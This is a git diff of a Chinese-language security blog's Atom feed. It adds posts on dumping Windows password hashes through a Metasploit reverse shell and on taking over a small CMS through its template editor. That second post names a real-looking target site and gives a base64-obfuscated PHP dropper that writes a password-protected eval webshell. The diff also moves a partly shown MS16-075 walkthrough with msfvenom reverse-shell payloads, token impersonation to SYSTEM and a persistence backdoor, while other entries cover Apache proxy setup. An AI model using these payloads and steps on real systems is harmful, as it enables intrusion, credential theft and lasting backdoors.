@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-07-08T17:41:37.628Z</updated>
+  <updated>2018-08-16T02:29:44.149Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,48 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="http://yoursite.com/2018/08/06/%E8%AE%B0%E4%B8%80%E6%AC%A1hashdump%E6%8F%90%E6%9D%83/"/>
+    <id>http://yoursite.com/2018/08/06/记一次hashdump提权/</id>
+    <published>2018-08-06T13:33:30.007Z</published>
+    <updated>2018-08-16T02:29:44.149Z</updated>
+    
+    <content type="html"><![CDATA[<p>提权的时候总能遇到无路可走的时候，有时候一个无意的举动就可能给你带来惊喜<br>这个服务器用了各种方法都没拿下了来 ，在实在没办法的时候运行了一下run hsahump,本来是没打算可以解密成功的，因为08的服务器因为组策略的原因导致弱口令非常少，所以我提的08当中，二十个都难遇一个弱口令这次遇到了，当然得详细记录了，嘿嘿<br>首先反弹一个shell到msf<br>然后运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run hashdump</span><br></pre></td></tr></table></figure></p><p><img src="http://pcf9imvwz.sabkt.gdipper.com/3.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>接着找到管理员的hash<br><img src="http://pcf9imvwz.sabkt.gdipper.com/4.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>最后</p><p><img src="http://pcf9imvwz.sabkt.gdipper.com/5.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>登陆</p><p><img src="http://pcf9imvwz.sabkt.gdipper.com/6.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;提权的时候总能遇到无路可走的时候，有时候一个无意的举动就可能给你带来惊喜&lt;br&gt;这个服务器用了各种方法都没拿下了来 ，在实在没办法的时候运行了一下run hsahump,本来是没打算可以解密成功的，因为08的服务器因为组策略的原因导致弱口令非常少，所以我提的08当中，二十个
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://yoursite.com/2018/08/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%90%9C%E6%90%9C!CMSgetshell/"/>
+    <id>http://yoursite.com/2018/08/06/记一次曲折的搜搜!CMSgetshell/</id>
+    <published>2018-08-06T12:59:22.235Z</published>
+    <updated>2018-08-16T02:29:44.149Z</updated>
+    
+    <content type="html"><![CDATA[<p>今天朋友丢了一个后台过来，说找不到可上传的地方。让我看看<br>1,首先登录后台看了一下，是搜搜!CMS，表示没听过emmmm,先去百度上搜索相关漏洞，发现毛都没有，有可能是小到不能在小的cms了<br><img src="http://pcf9imvwz.sabkt.gdipper.com/7.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>2,在后台逛了一下，发现模版这儿可以修改php文件，有意思<br><img src="http://pcf9imvwz.sabkt.gdipper.com/8.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>3,看一下这个页面是不是在根目录,明显不是<br><img src="http://pcf9imvwz.sabkt.gdipper.com/9.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>4,没有路径也白瞎，继续找吧，于是发现这个，那个蓝色的英文单词竟然和之前的对应，点击了一下，真的是唉<br><img src="http://pcf9imvwz.sabkt.gdipper.com/10.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>5,写一个一句话进去<br><img src="http://pcf9imvwz.sabkt.gdipper.com/11.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>6,解析了 ps(于是心里哼着小曲继续了，心想怎么那么简单的站还叫我拿)<br><img src="http://pcf9imvwz.sabkt.gdipper.com/12.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>7,这是什么情况，已经排除了刀的问题，大马也没有，明明可以解析呀 (于是陷入沉思中。。。。。。)<br><img src="http://pcf9imvwz.sabkt.gdipper.com/13.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>9,突然想起，我写的明明是news.php文件，但是打开时却在<a href="http://www.sdkhjn.com/page/news/index.php这是动态生成的页面吗，写个phpinfo()看一下路径" target="_blank" rel="noopener">http://www.sdkhjn.com/page/news/index.php这是动态生成的页面吗，写个phpinfo()看一下路径</a><br><img src="http://pcf9imvwz.sabkt.gdipper.com/14.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>10,如图：找到绝对路径<br><img src="http://pcf9imvwz.sabkt.gdipper.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>10,用php自定义写入马儿的路径(怕被杀，特意base64加密了一下,只要一执行这个文件，就会在定义的路径写入马儿)<br><img src="http://pcf9imvwz.sabkt.gdipper.com/16.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>11,果然的的猜想没错，菜刀直连<br><img src="http://pcf9imvwz.sabkt.gdipper.com/17.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>附上我用的那个马吧，密码BLUE<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$fp</span> = @fopen(<span class="string">"404.php"</span>, <span class="string">'w'</span>);</span><br><span class="line">@fwrite(<span class="variable">$fp</span>,base64_decode</span><br><span class="line">(<span class="string">'PD9waHANCmNsYXNzIGV2YWxzew0KICAgICAgICBwcm90ZWN0ZWQgJGxpbmtzOw0KICAgICAgICBmdW5j</span></span><br><span class="line"><span class="string">dGlvbiBfX2NvbnN0cnVjdCgkYW4pew0KICAgICAgICAgICAgICAgICR0aGlzLT5saW5rcyA9ICRhbjsNCi</span></span><br><span class="line"><span class="string">AgICAgICAgICAgICAgICBAZXZhbCgiXCR0aXRsZT0xOyIuJHRoaXMtPmxpbmtzKTsNCiAgICAgICAgfQ0K</span></span><br><span class="line"><span class="string">fQ0KJFdlYlNoZWxsID0gbmV3IGV2YWxzKEAkX1BPU1RbJ0JMVUUnXSk7DQo/Pg=='</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;今天朋友丢了一个后台过来，说找不到可上传的地方。让我看看&lt;br&gt;1,首先登录后台看了一下，是搜搜!CMS，表示没听过emmmm,先去百度上搜索相关漏洞，发现毛都没有，有可能是小到不能在小的cms了&lt;br&gt;&lt;img src=&quot;http://pcf9imvwz.sabkt.gd
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>SQL注入备忘手册</title>
@@ -69,26 +111,26 @@
   </entry>
   
   <entry>
-    <title>windows下删除不掉文件夹：找不到该项目无法删除文件夹</title>
-    <link href="http://yoursite.com/2018/04/03/windows%E4%B8%8B%E5%88%A0%E9%99%A4%E4%B8%8D%E6%8E%89%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%9A%E6%89%BE%E4%B8%8D%E5%88%B0%E8%AF%A5%E9%A1%B9%E7%9B%AE%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E5%A4%B9/"/>
-    <id>http://yoursite.com/2018/04/03/windows下删除不掉文件夹：找不到该项目无法删除文件夹/</id>
+    <title>Apache设置反向代理</title>
+    <link href="http://yoursite.com/2018/04/03/Apache%E8%AE%BE%E7%BD%AE%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9B%AE%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/"/>
+    <id>http://yoursite.com/2018/04/03/Apache设置反向代理目录的方法/</id>
     <published>2018-04-03T10:04:51.000Z</published>
-    <updated>2018-07-15T15:42:06.187Z</updated>
+    <updated>2018-07-14T17:07:35.599Z</updated>
     
-    <content type="html"><![CDATA[<p><img src="http://opgnaclz6.bkt.clouddn.com/23.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在cmd中rd /S 文件夹名或路径</span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p>设置反向代理有三个文件要用apache目录下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\conf\httpd.conf</span><br><span class="line">\conf\extra\httpd-proxy.conf</span><br><span class="line">\conf\extra\httpd-vhosts.conf</span><br></pre></td></tr></table></figure></p><p>1.设置httpd.conf<br>打开Apache24/conf文件夹下的httpd.conf设置文件，找到一下几行把前面的注释‘#’删除<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_connect_modulemodules/mod_proxy_connect.so</span><br><span class="line">LoadModule proxy_ftp_modulemodules/mod_proxy_ftp.so</span><br><span class="line">LoadModuleproxy_http_modulemodules/mod_proxy_http.so</span><br></pre></td></tr></table></figure></p><p>(Ps:很多人都会注释LoadModuleproxy_balancer_modulemodules/mod_proxy_balancer.so，然而这个是做负载均衡用的一个功能，单纯做反向代理的话，不需要用这个，而且取消了这里的注释不进行相应的设置的话，会导致apache服务无法开启)<br>然后找到<br>Include conf/extra/httpd-vhosts.conf<br>这一行前面的注释‘#’也删除，引入这个文件 </p><p>apache反向代理全站<br><code>`</code>bash</p><virtualhost *:80=""><br>    ServerAdmin <a href="mailto:webmaster@127.0.0.1" target="_blank" rel="noopener">webmaster@127.0.0.1</a>    #主机名<br>    #DocumentRoot “d:/**/htdocs/xx.com”<br>    ServerName 127.0.0.1<br>    ServerAlias 127.0.0.1<br>    #ErrorLog “logs/xx.com-error.log”<br>    #CustomLog “logs/xx.com-access.log” common<br>     ProxyPass /  <a href="http://127.0.0.1:8888/" target="_blank" rel="noopener">http://127.0.0.1:8888/</a><br><br></virtualhost> <p>apache反向代理二级目录 </p><virtualhost *:80=""><br>    ServerAdmin <a href="mailto:webmaster@127.0.0.1" target="_blank" rel="noopener">webmaster@127.0.0.1</a>    #主机名<br>    #DocumentRoot “d:/**/htdocs/xx.com”<br>    ServerName 127.0.0.1<br>    ServerAlias 127.0.0.1<br>    #ErrorLog “logs/xx.com-error.log”<br>    #CustomLog “logs/xx.com-access.log” common<br>     ProxyPass /abc  <a href="http://127.0.0.1:8888/abc" target="_blank" rel="noopener">http://127.0.0.1:8888/abc</a><br><br></virtualhost> ]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;&lt;img src=&quot;http://opgnaclz6.bkt.clouddn.com/23.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJ
+        &lt;p&gt;设置反向代理有三个文件要用apache目录下&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l
       
     
     </summary>
     
-      <category term="杂七杂八" scheme="http://yoursite.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
+      <category term="SEO" scheme="http://yoursite.com/categories/SEO/"/>
     
-      <category term="windows7" scheme="http://yoursite.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/windows7/"/>
+      <category term="反向代理" scheme="http://yoursite.com/categories/SEO/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
     
     
   </entry>
@@ -121,26 +163,26 @@
   </entry>
   
   <entry>
-    <title>Apache设置反向代理</title>
-    <link href="http://yoursite.com/2018/04/03/Apache%E8%AE%BE%E7%BD%AE%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9B%AE%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/"/>
-    <id>http://yoursite.com/2018/04/03/Apache设置反向代理目录的方法/</id>
+    <title>windows下删除不掉文件夹：找不到该项目无法删除文件夹</title>
+    <link href="http://yoursite.com/2018/04/03/windows%E4%B8%8B%E5%88%A0%E9%99%A4%E4%B8%8D%E6%8E%89%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%9A%E6%89%BE%E4%B8%8D%E5%88%B0%E8%AF%A5%E9%A1%B9%E7%9B%AE%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E5%A4%B9/"/>
+    <id>http://yoursite.com/2018/04/03/windows下删除不掉文件夹：找不到该项目无法删除文件夹/</id>
     <published>2018-04-03T10:04:51.000Z</published>
-    <updated>2018-07-14T17:07:35.599Z</updated>
+    <updated>2018-07-15T15:42:06.187Z</updated>
     
-    <content type="html"><![CDATA[<p>设置反向代理有三个文件要用apache目录下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\conf\httpd.conf</span><br><span class="line">\conf\extra\httpd-proxy.conf</span><br><span class="line">\conf\extra\httpd-vhosts.conf</span><br></pre></td></tr></table></figure></p><p>1.设置httpd.conf<br>打开Apache24/conf文件夹下的httpd.conf设置文件，找到一下几行把前面的注释‘#’删除<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_connect_modulemodules/mod_proxy_connect.so</span><br><span class="line">LoadModule proxy_ftp_modulemodules/mod_proxy_ftp.so</span><br><span class="line">LoadModuleproxy_http_modulemodules/mod_proxy_http.so</span><br></pre></td></tr></table></figure></p><p>(Ps:很多人都会注释LoadModuleproxy_balancer_modulemodules/mod_proxy_balancer.so，然而这个是做负载均衡用的一个功能，单纯做反向代理的话，不需要用这个，而且取消了这里的注释不进行相应的设置的话，会导致apache服务无法开启)<br>然后找到<br>Include conf/extra/httpd-vhosts.conf<br>这一行前面的注释‘#’也删除，引入这个文件 </p><p>apache反向代理全站<br><code>`</code>bash</p><virtualhost *:80=""><br>    ServerAdmin <a href="mailto:webmaster@127.0.0.1" target="_blank" rel="noopener">webmaster@127.0.0.1</a>    #主机名<br>    #DocumentRoot “d:/**/htdocs/xx.com”<br>    ServerName 127.0.0.1<br>    ServerAlias 127.0.0.1<br>    #ErrorLog “logs/xx.com-error.log”<br>    #CustomLog “logs/xx.com-access.log” common<br>     ProxyPass /  <a href="http://127.0.0.1:8888/" target="_blank" rel="noopener">http://127.0.0.1:8888/</a><br><br></virtualhost> <p>apache反向代理二级目录 </p><virtualhost *:80=""><br>    ServerAdmin <a href="mailto:webmaster@127.0.0.1" target="_blank" rel="noopener">webmaster@127.0.0.1</a>    #主机名<br>    #DocumentRoot “d:/**/htdocs/xx.com”<br>    ServerName 127.0.0.1<br>    ServerAlias 127.0.0.1<br>    #ErrorLog “logs/xx.com-error.log”<br>    #CustomLog “logs/xx.com-access.log” common<br>     ProxyPass /abc  <a href="http://127.0.0.1:8888/abc" target="_blank" rel="noopener">http://127.0.0.1:8888/abc</a><br><br></virtualhost> ]]></content>
+    <content type="html"><![CDATA[<p><img src="http://opgnaclz6.bkt.clouddn.com/23.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在cmd中rd /S 文件夹名或路径</span><br></pre></td></tr></table></figure>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;设置反向代理有三个文件要用apache目录下&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l
+        &lt;p&gt;&lt;img src=&quot;http://opgnaclz6.bkt.clouddn.com/23.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJ
       
     
     </summary>
     
-      <category term="SEO" scheme="http://yoursite.com/categories/SEO/"/>
+      <category term="杂七杂八" scheme="http://yoursite.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
     
-      <category term="反向代理" scheme="http://yoursite.com/categories/SEO/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
+      <category term="windows7" scheme="http://yoursite.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/windows7/"/>
     
     
   </entry>
@@ -303,34 +345,6 @@
   </entry>
   
   <entry>
-    <title>MS16-075提权</title>
-    <link href="http://yoursite.com/2018/01/15/MS16-075%E6%8F%90%E6%9D%83/"/>
-    <id>http://yoursite.com/2018/01/15/MS16-075提权/</id>
-    <published>2018-01-15T10:37:51.000Z</published>
-    <updated>2018-07-15T16:01:44.245Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><p>目标IP:192.168.163.134<br>接收反弹的IP：192.168.163.129  //注意：必须是外网IP<br>本机IP：192.168.163.120</p></blockquote><h3 id="1，在本机MSF框架执行："><a href="#1，在本机MSF框架执行：" class="headerlink" title="1，在本机MSF框架执行："></a>1，在本机MSF框架执行：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.163.134  LPORT=3306 -f exe -o 3306.exe</span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/6.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>其中windows/meterpreter/reverse_tcp反弹端口类型，lhost是反弹连接的服务器Ip地址，注意该ip地址必须是独立服务器，或者必须是外网端口映射，换句话说，就是反弹必须能够接收，lport为反弹的端口，3306为生成的程序.</p><h3 id="2，在监听服务器上执行监听命令"><a href="#2，在监听服务器上执行监听命令" class="headerlink" title="2，在监听服务器上执行监听命令"></a>2，在监听服务器上执行监听命令</h3><p>（1）启动msf<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Msfconsole</span><br></pre></td></tr></table></figure></p><p> <img src="http://opgnaclz6.bkt.clouddn.com/7.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p> （2）配置meterpreter参数<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use exploit/multi/handler</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> LHOST 192.233.23.23</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> LPORT 4433</span><br><span class="line">Exploit</span><br></pre></td></tr></table></figure></p><p><img src="http://opgnaclz6.bkt.clouddn.com/8.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>注：（如果反弹回来不是目标，则background再exploit）</p><h3 id="3，上传3306-exe程序到目标服务器及执行"><a href="#3，上传3306-exe程序到目标服务器及执行" class="headerlink" title="3，上传3306.exe程序到目标服务器及执行"></a>3，上传3306.exe程序到目标服务器及执行</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/9.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="4上传ms16-075文件"><a href="#4上传ms16-075文件" class="headerlink" title="4上传ms16-075文件"></a>4上传ms16-075文件</h3><p>通过webshll上传potato.exe文件，或者在msf下面执行命令上传：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /root/potato.exe C:\\inetpub\\wwwroot\\dede</span><br></pre></td></tr></table></figure></p><p>查看当前目录</p><p><img src="http://opgnaclz6.bkt.clouddn.com/10.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>如图：已经再当前目录就不需要跳转目录了，如果不是则<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\\inetpub\\wwwroot\\dede</span><br><span class="line">meterpreter &gt; use incognito</span><br></pre></td></tr></table></figure></p><p><img src="http://opgnaclz6.bkt.clouddn.com/11.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>如图已经返回SYSTEM了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">meterpreter &gt; execute -cH -f ./potato.exe</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; impersonate_token “NT AUTHORITY\\SYSTEM”</span><br></pre></td></tr></table></figure></p><p><img src="http://opgnaclz6.bkt.clouddn.com/12.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>如图，第一次我执行NT AUTHORITY\SYSTEM失败了，因为少了一个/<br>meterpreter &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br>得到SYSTEM后你可以进shell添加管理员账户密码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure></p><p>或者留下后门<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run?persistence?-X?-i?10?-p?6666?-r?192.168.163.129</span><br></pre></td></tr></table></figure></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;blockquote&gt;
-&lt;p&gt;目标IP:192.168.163.134&lt;br&gt;接收反弹的IP：192.168.163.129  //注意：必须是外网IP&lt;br&gt;本机IP：192.168.163.120&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&quot;1，在本机MSF框架执行
-      
-    
-    </summary>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="提权" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8F%90%E6%9D%83/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>MS16-032提权</title>
     <link href="http://yoursite.com/2018/01/15/MS16-032%E6%8F%90%E6%9D%83/"/>
     <id>http://yoursite.com/2018/01/15/MS16-032提权/</id>
@@ -370,6 +384,34 @@
       
       
         &lt;h3 id=&quot;1-收集OS名称和版本信息&quot;&gt;&lt;a href=&quot;#1-收集OS名称和版本信息&quot; class=&quot;headerlink&quot; title=&quot;1. 收集OS名称和版本信息&quot;&gt;&lt;/a&gt;1. 收集OS名称和版本信息&lt;/h3&gt;&lt;figure class=&quot;highlight ba
+      
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="提权" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8F%90%E6%9D%83/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>MS16-075提权</title>
+    <link href="http://yoursite.com/2018/01/15/MS16-075%E6%8F%90%E6%9D%83/"/>
+    <id>http://yoursite.com/2018/01/15/MS16-075提权/</id>
+    <published>2018-01-15T10:37:51.000Z</published>
+    <updated>2018-07-15T16:01:44.245Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>目标IP:192.168.163.134<br>接收反弹的IP：192.168.163.129  //注意：必须是外网IP<br>本机IP：192.168.163.120</p></blockquote><h3 id="1，在本机MSF框架执行："><a href="#1，在本机MSF框架执行：" class="headerlink" title="1，在本机MSF框架执行："></a>1，在本机MSF框架执行：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.163.134  LPORT=3306 -f exe -o 3306.exe</span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/6.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>其中windows/meterpreter/reverse_tcp反弹端口类型，lhost是反弹连接的服务器Ip地址，注意该ip地址必须是独立服务器，或者必须是外网端口映射，换句话说，就是反弹必须能够接收，lport为反弹的端口，3306为生成的程序.</p><h3 id="2，在监听服务器上执行监听命令"><a href="#2，在监听服务器上执行监听命令" class="headerlink" title="2，在监听服务器上执行监听命令"></a>2，在监听服务器上执行监听命令</h3><p>（1）启动msf<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Msfconsole</span><br></pre></td></tr></table></figure></p><p> <img src="http://opgnaclz6.bkt.clouddn.com/7.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p> （2）配置meterpreter参数<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 